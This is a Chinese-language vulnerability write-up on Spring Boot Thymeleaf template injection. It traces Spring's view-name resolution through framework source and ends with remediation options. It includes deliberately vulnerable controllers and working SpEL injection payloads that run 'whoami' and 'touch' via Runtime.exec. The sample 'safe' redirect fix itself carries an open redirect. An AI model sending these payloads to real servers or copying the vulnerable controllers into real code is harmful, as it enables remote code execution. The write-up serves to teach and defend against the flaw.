Spring Boot Thymeleaf 模板注入
==============================

一、漏洞简介
------------

Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python
web开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎

二、漏洞影响
------------

三、复现过程
------------

### 0x01 基础知识

Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC
的基础上实现了自动配置，简化了开发人员开发过程。Spring MVC 是通过一个叫
DispatcherServlet 前端控制器的来拦截请求的。而在 Spring Boot 中
使用自动配置把 DispatcherServlet 前端控制器自动配置到框架中。

例如，我们来解析 /users 这个请求

![1.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootThymeleaf模板注入/media/rId25.png)

1.  DispatcherServlet 前端控制器拦截请求 /users

2.  servlet 决定使用哪个 handler 处理

3.  Spring 检测哪个控制器匹配 /users，Spring 从 \@RquestMapping
    中查找出需要的信息

4.  Spring 找到正确的 Controller 方法后，开始执行 Controller 方法

5.  返回 users 对象列表

6.  根据与客户端交互需要返回 Json 或者 Xml 格式

### spring boot 相关注解

-   \@Controller 处理 Http 请求
-   \@RestController \@Controller 的衍生注解
-   \@RequestMapping 路由请求 可以设置各种操作方法
-   \@GetMapping GET 方法的路由
-   \@PostMapping POST 方法的路由
-   \@PutMapping PUT 方法的路由
-   \@DeleteMapping DELETE 方法的路由
-   \@PathVariable 处理请求 url 路径中的参数 /user/{id}
-   \@RequestParam 处理问号后面的参数
-   \@RequestBody 请求参数以json格式提交
-   \@ResponseBody 返回 json 格式

### Controller注解

\@Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了
thymeleaf 作为模板开发，需要从后台直接返回 Model
对象到前台，那么这时候就需要使用 \@Controller 来注解。

### RequestMapping注解

用来将一个controller添加至路由中

0x02 环境配置
-------------

> https://github.com/veracode-research/spring-view-manipulation/

我们以spring boot + Thymeleaf模板创建一个带有漏洞的项目。核心代码如下

        @GetMapping("/path")
        public String path(@RequestParam String lang) {
            return  lang ; //template path is tainted
        }

代码含义如下：用户请求的url为path，参数名称为lang，则服务器通过Thymeleaf模板，去查找相关的模板文件。

例如，用户通过get请求`/path?lang=en`，则服务器去自动拼接待查找的模板文件名，为`resources/templates/en.html`，并返回给用户的浏览器。

上面的代码存在两个问题：

1.  是不是存在任意文件读取？
2.  是不是存在诸如模板注入的漏洞？？？

0x03 模板注入分析
-----------------

spring boot如何查找controller这块我们不分析，因为对于我们不重要。

spring
boot在`org.springframework.web.servlet.ModelAndView`方法中，开始处理用户的请求

     /**
         * This implementation expects the handler to be an {@link HandlerMethod}.
         */
        @Override
        @Nullable
        public final ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler)
                throws Exception {

            return handleInternal(request, response, (HandlerMethod) handler);
        }

随后在`org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle`方法中，通过invokeForRequest函数，根据用户提供的url，调用相关的controller，并将其返回值，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户

     /**
         * Invoke the method and handle the return value through one of the
         * configured {@link HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers}.
         * @param webRequest the current request
         * @param mavContainer the ModelAndViewContainer for this request
         * @param providedArgs "given" arguments matched by type (not resolved)
         */
        public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,
                Object... providedArgs) throws Exception {

            Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);
            setResponseStatus(webRequest);

            if (returnValue == null) {
                if (isRequestNotModified(webRequest) || getResponseStatus() != null || mavContainer.isRequestHandled()) {
                    disableContentCachingIfNecessary(webRequest);
                    mavContainer.setRequestHandled(true);
                    return;
                }
            }
            else if (StringUtils.hasText(getResponseStatusReason())) {
                mavContainer.setRequestHandled(true);
                return;
            }

            mavContainer.setRequestHandled(false);
            try {
                this.returnValueHandlers.handleReturnValue(
                        returnValue, getReturnValueType(returnValue), mavContainer, webRequest);
            }
        }

在函数中，调用`this.returnValueHandlers.handleReturnValue`去处理返回结果。最终在`org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue`方法中，将controller返回值作为视图名称。代码如下

     @Override
        public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType,
                ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {

            if (returnValue instanceof CharSequence) {
                String viewName = returnValue.toString();
                mavContainer.setViewName(viewName);
                if (isRedirectViewName(viewName)) {
                    mavContainer.setRedirectModelScenario(true);
                }
            }

spring
boot最终在`org.springframework.web.servlet.DispatcherServlet#processDispatchResult`方法中，调用Thymeleaf模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下`org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression`

            final String viewTemplateName = getTemplateName();
            final ISpringTemplateEngine viewTemplateEngine = getTemplateEngine();

          
            final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);

            final FragmentExpression fragmentExpression;
            try {
                // By parsing it as a standard expression, we might profit from the expression cache
                fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
            } catch (final TemplateProcessingException e) {
                throw new IllegalArgumentException("Invalid template name specification: '" + viewTemplateName + "'");
            }

0x04 不安全的java代码
---------------------

#### 第一种：

        @GetMapping("/path")
        public String path(@RequestParam String lang) {
            return  lang ; //template path is tainted
        }

在查找模板中，引用了用户输入的内容

payload

    GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x HTTP/1.1
    Host: www.0-sec.org:8090
    Connection: close

![2.png](/Users/aresx/Documents/VulWiki/.resource/SpringBootThymeleaf模板注入/media/rId33.png)

#### 第二种

根据spring
boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。

> https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html\#mvc-ann-return-types

在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞。例如我们可以控制document参数

    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
    }
    GET /doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x

0x05 修复方案
-------------

### 1. 设置ResponseBody注解

如果设置`ResponseBody`，则不再调用模板解析

### 2. 设置redirect重定向

    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //CWE-601, as we can control the hostname in redirect

根据spring
boot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值

### 3. response

    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }

由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP
Response，因此不会发生视图名称解析

参考链接
--------

> https://www.cnblogs.com/potatsoSec/p/13620019.html
